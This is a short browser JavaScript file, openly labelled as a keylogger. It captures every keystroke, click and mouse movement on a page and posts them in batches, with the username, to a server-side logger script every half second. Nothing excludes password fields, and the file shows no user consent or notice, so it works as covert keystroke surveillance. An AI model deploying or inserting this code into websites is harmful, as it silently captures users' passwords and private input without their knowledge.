// Record all key events into an array
var aa_events = [];

function aa_logEvent(evt) {
    console.log(evt);
    var data;
    var x;
    var y;
    let type = evt.type;
    switch(type) {
        case "keydown":
        case "keyup":
            data = evt.key;
            break;
        case "click":
        case "contextmenu":
        case "dblclick":
        case "wheel":
        case "mousemove":
            x = evt.clientX;
            y = evt.clientY;
            break;
    }
    aa_events.push({ time: Date.now(), type: type, data: data, x: x, y: y });
}
window.addEventListener("keydown", aa_logEvent);
window.addEventListener("keyup", aa_logEvent);
window.addEventListener("click", aa_logEvent);
window.addEventListener("contextmenu", aa_logEvent);
window.addEventListener("dblclick", aa_logEvent);
window.addEventListener("wheel", aa_logEvent);
window.addEventListener("mousemove", aa_logEvent);

// Push to server at regular intervals
// Reduce interval timing for more frequent recordings, but increases server load
// You can also set this to send only if certain number of key stroke were made.
window.setInterval(function () {
  if (aa_events.length>5) {
      eventsToSend = aa_events;
      aa_events = [];
      var data = JSON.stringify({ user: username, events: eventsToSend });

      let url = `${window.location.origin}/${web_root}/logger/keylogger-srv.php`;
      fetch(url, { method: 'post', body: data })
      .then(response => response.text())
      .then(data => {
        console.log('[keylogger]:', data);
      })
      .catch((error) => {
        // TODO: There is no server error currently.
        console.error('[keylogger] Error:', error);
      });
  }
}, 500);
